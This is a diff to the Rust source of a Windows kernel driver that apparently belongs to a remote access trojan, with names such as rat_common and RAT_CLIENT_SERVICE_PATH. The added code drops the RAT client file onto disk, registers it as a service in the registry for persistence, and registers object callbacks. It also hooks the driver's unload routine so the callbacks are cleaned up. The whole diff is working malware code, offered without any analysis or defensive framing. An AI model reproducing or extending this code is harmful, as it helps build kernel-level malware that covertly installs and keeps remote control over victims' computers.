@@ -1,11 +1,13 @@
 use core::ffi::c_void;
-use core::ptr;
+use core::sync::atomic::{AtomicPtr, Ordering};
+use core::{mem, ptr};
 
 use rat_common::utils::DropGuard;
 use wdk::{self, nt_success};
 use wdk_sys::_MODE::KernelMode;
 use wdk_sys::ntddk::{
-    KeDelayExecutionThread, PsCreateSystemThread, RtlInitUnicodeString, ZwClose, ZwCreateKey,
+    KeDelayExecutionThread, ObUnRegisterCallbacks, PsCreateSystemThread, RtlInitUnicodeString,
+    ZwClose, ZwCreateKey,
 };
 use wdk_sys::{
     HANDLE, KEY_ALL_ACCESS, LARGE_INTEGER, NTSTATUS, OBJ_CASE_INSENSITIVE, OBJ_KERNEL_HANDLE,
@@ -24,16 +26,19 @@ use crate::wrappers::bindings::InitializeObjectAttributes;
 use crate::wrappers::{fs, registry};
 use crate::{error, info};
 
-unsafe extern "C" fn initialize_thread_routine(_: *mut c_void) {
+type DriverUnloadFn = unsafe extern "C" fn(driver: PDRIVER_OBJECT);
+
+unsafe extern "C" fn initialize_thread_routine(driver: *mut c_void) {
+    let driver = driver.cast();
     let mut sleep = LARGE_INTEGER { QuadPart: -3000000 };
     for _ in 0..MAX_INITIALIZE_ATTEMPTS {
-        if initialize().is_ok() {
-            break;
-        }
-
         let status = unsafe { KeDelayExecutionThread(KernelMode as i8, 0, &mut sleep) };
         if !nt_success(status) {
             error!("KeDelayExecutionThread failed: 0x{status:X}");
+            break;
+        }
+
+        if initialize(driver).is_ok() {
             break;
         }
     }
@@ -112,19 +117,61 @@ fn drop_file() -> anyhow::Result<()> {
     Ok(())
 }
 
-fn initialize() -> anyhow::Result<()> {
-    drop_file()
-        .inspect(|_| match setup_service_registry(RAT_CLIENT_SERVICE_PATH) {
+fn initialize(driver: PDRIVER_OBJECT) -> anyhow::Result<()> {
+    let mut success = true;
+    match drop_file() {
+        Ok(_) => match setup_service_registry(RAT_CLIENT_SERVICE_PATH) {
             Ok(_) => info!("Service registry setup successfully"),
-            Err(e) => info!("Failed to setup service registry: {e}"),
-        })
-        .inspect_err(|e| {
+            Err(e) => {
+                success = false;
+                error!("Failed to setup service registry: {e}");
+            }
+        },
+        Err(e) => {
             error!("Failed to drop RAT client: {e}");
-        })?;
+            success = false;
+        }
+    }
 
-    object::ob_register_callbacks().inspect_err(|e| {
-        error!("Failed to register object callbacks: {e}");
-    })?;
+    match object::ob_register_callbacks() {
+        Ok(handle) => {
+            info!("Register object callbacks successfully");
+
+            if let Some(driver) = unsafe { driver.as_mut() } {
+                static HANDLE: AtomicPtr<c_void> = AtomicPtr::new(ptr::null_mut());
+                HANDLE.store(handle, Ordering::Release);
+
+                static CURRENT_DRIVER_UNLOAD: AtomicPtr<u8> = AtomicPtr::new(ptr::null_mut());
+                if let Some(unload) = driver.DriverUnload {
+                    CURRENT_DRIVER_UNLOAD.store(unload as *mut u8, Ordering::Release);
+                }
+
+                driver.DriverUnload = Some(driver_unload);
+
+                unsafe extern "C" fn driver_unload(driver: PDRIVER_OBJECT) {
+                    let old_driver_unload_ptr = CURRENT_DRIVER_UNLOAD.load(Ordering::Acquire);
+                    if !old_driver_unload_ptr.is_null() {
+                        unsafe {
+                            let old_driver_unload =
+                                mem::transmute::<*mut u8, DriverUnloadFn>(old_driver_unload_ptr);
+                            old_driver_unload(driver);
+                        }
+                    }
+
+                    let handle = HANDLE.load(Ordering::Acquire);
+                    unsafe {
+                        ObUnRegisterCallbacks(handle);
+                    }
+                }
+            }
+        }
+        Err(e) => {
+            success = false;
+            error!("Failed to register object callbacks: {e}");
+        }
+    }
+
+    anyhow::ensure!(success, "At least 1 initialization routine failed");
     Ok(())
 }
 
@@ -143,7 +190,7 @@ pub fn driver_entry_prehook(
             ptr::null_mut(),
             ptr::null_mut(),
             Some(initialize_thread_routine),
-            ptr::null_mut(),
+            driver.cast(),
         )
     };
     anyhow::ensure!(
